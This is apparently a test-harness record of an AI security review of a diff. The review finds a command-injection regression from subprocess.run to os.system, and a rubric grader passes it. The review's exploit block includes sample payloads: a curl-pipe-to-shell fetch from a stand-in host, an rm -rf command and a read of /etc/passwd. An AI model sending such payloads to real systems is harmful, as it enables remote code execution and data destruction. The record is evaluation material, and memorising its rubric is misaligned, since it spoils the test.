@@ -1,0 +1,53 @@
+{
+  "caseId": "obfuscated-cmdi",
+  "rep": 4,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-obfuscated-cmdi.patch"
+  ],
+  "output": "## Security Review: `src/media/thumbnail.py`\n\n### Critical — OS Command Injection (CWE-78)\n\nThe diff replaces a safe, argument-list subprocess call with a shell-interpreted `os.system` call built from unsanitized user input.\n\n**Before (safe):**\n```python\nsubprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)\n```\n`subprocess.run` with a list and no `shell=True` passes arguments directly to `execve` — no shell parses them, so metacharacters in user input are inert.\n\n**After (vulnerable):**\n```python\nparts = [\"convert\", infile, \"-resize\", size, outfile]\nos.system(\" \".join(parts))\n```\n`os.system()` runs its string through `/bin/sh -c`. Both `infile` (`request.GET[\"src\"]`) and `size` (`request.GET[\"size\"]`) are attacker-controlled request parameters, joined straight into the shell command with no escaping.\n\n**Exploit:**\n```\nGET /thumbnail?src=x.png;+curl+evil.sh|sh;\nGET /thumbnail?size=100x100;+rm+-rf+/tmp/*\nGET /thumbnail?src=$(cat+/etc/passwd)\n```\nAny shell metacharacter (`;`, `|`, `&&`, `$()`, backticks, `>`) yields arbitrary command execution as the web server user — full remote code execution.\n\n### Note — the `shlex` import is a decoy\nLine 6 adds `import shlex`, but it is **never used**. Its presence suggests input was being \"sanitized,\" but there is no `shlex.quote()` call anywhere. It launders the diff into looking security-conscious while the actual change removes the existing protection. Do not let it distract from the real defect.\n\n### Fix\nRevert to the argument-list form — it was already correct:\n```python\nsubprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)\n```\nDrop the `os.system` call, the `parts`/`shlex` lines, and (optionally) validate `size` against a strict pattern like `^\\d+x\\d+$` and confine `src` to an allowlisted directory to prevent path traversal / arbitrary file reads by ImageMagick.\n\n---\n\n**Verdict:** This change must not be merged. It is a textbook regression from a shell-safe call to shell-based command injection on two user-controlled parameters — the single most severe class of web vulnerability (RCE).",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-18T23:59:42.033Z",
+  "durationMs": 35357,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the OS command injection vulnerability, explaining that user-controlled `size` and `src` parameters flow unsanitized into `os.system(\" \".join(parts))`, which invokes a shell and allows metacharacter injection, contrasting it with the previous safe `subprocess.run` argument-list form. It also correctly noted the `shlex` import is unused and a decoy rather than mistaking it for sanitization, and did not conclude the code was safe or limit its findings to style issues.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the OS command injection vulnerability, explaining that user-controlled `size` and `src` parameters flow unsanitized into `os.system(\" \".join(parts))`, which invokes a shell and allows metacharacter injection, contrasting it with the previous safe `subprocess.run` argument-list form. It also correctly noted the `shlex` import is unused and a decoy rather than mistaking it for sanitization, and did not conclude the code was safe or limit its findings to style issues."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identifies that the diff replaces the safe argument-list subprocess.run call with os.system(\" \".join(parts)), explains that os.system invokes /bin/sh -c on a string built from unsanitized user-controlled request.GET parameters (size, src), gives concrete shell metacharacter exploits, and calls it a critical OS command injection/RCE vulnerability rather than mistaking it for a safe argument vector — matching the rubric's required finding.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identifies that the diff replaces the safe argument-list subprocess.run call with os.system(\" \".join(parts)), explains that os.system invokes /bin/sh -c on a string built from unsanitized user-controlled request.GET parameters (size, src), gives concrete shell metacharacter exploits, and calls it a critical OS command injection/RCE vulnerability rather than mistaking it for a safe argument vector — matching the rubric's required finding."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe diff introduces an OS command injection vulnerability: user-controlled `size`/`src` from request.GET are collected into a `parts` list that is then joined into a single shell string with `' '.join(parts)` and passed to `os.system(...)`, allowing arbitrary shell command execution (e.g. size='100x100; rm -rf ~'). The previous code used a safe `subprocess.run([...])` argument vector. PASS only if the review identifies this as a real command/shell injection vulnerability caused by user input reaching `os.system`; FAIL if it misses it, concludes the code is safe (e.g. mistakes `parts` for a safe argument vector), or only comments on style or the unused `shlex` import.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\n## Security Review: `src/media/thumbnail.py`\n\n### Critical — OS Command Injection (CWE-78)\n\nThe diff replaces a safe, argument-list subprocess call with a shell-interpreted `os.system` call built from unsanitized user input.\n\n**Before (safe):**\n```python\nsubprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)\n```\n`subprocess.run` with a list and no `shell=True` passes arguments directly to `execve` — no shell parses them, so metacharacters in user input are inert.\n\n**After (vulnerable):**\n```python\nparts = [\"convert\", infile, \"-resize\", size, outfile]\nos.system(\" \".join(parts))\n```\n`os.system()` runs its string through `/bin/sh -c`. Both `infile` (`request.GET[\"src\"]`) and `size` (`request.GET[\"size\"]`) are attacker-controlled request parameters, joined straight into the shell command with no escaping.\n\n**Exploit:**\n```\nGET /thumbnail?src=x.png;+curl+evil.sh|sh;\nGET /thumbnail?size=100x100;+rm+-rf+/tmp/*\nGET /thumbnail?src=$(cat+/etc/passwd)\n```\nAny shell metacharacter (`;`, `|`, `&&`, `$()`, backticks, `>`) yields arbitrary command execution as the web server user — full remote code execution.\n\n### Note — the `shlex` import is a decoy\nLine 6 adds `import shlex`, but it is **never used**. Its presence suggests input was being \"sanitized,\" but there is no `shlex.quote()` call anywhere. It launders the diff into looking security-conscious while the actual change removes the existing protection. Do not let it distract from the real defect.\n\n### Fix\nRevert to the argument-list form — it was already correct:\n```python\nsubprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)\n```\nDrop the `os.system` call, the `parts`/`shlex` lines, and (optionally) validate `size` against a strict pattern like `^\\d+x\\d+$` and confine `src` to an allowlisted directory to prevent path traversal / arbitrary file reads by ImageMagick.\n\n---\n\n**Verdict:** This change must not be merged. It is a textbook regression from a shell-safe call to shell-based command injection on two user-controlled parameters — the single most severe class of web vulnerability (RCE).\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "transcript": {
+    "command": "claude",
+    "args": [
+      "-p",
+      "Review this diff for security issues and report your findings. Read the file 'diff-obfuscated-cmdi.patch' in your current working directory, then review it.",
+      "--allowedTools",
+      "Read Grep Glob",
+      "--strict-mcp-config",
+      "--model",
+      "claude-opus-4-8"
+    ],
+    "exitCode": 0,
+    "timedOut": false,
+    "stderr": "Warning: no stdin data received in 3s, proceeding without it. If piping from a slow command, redirect stdin explicitly: < /dev/null to skip, or wait longer."
+  }
+}
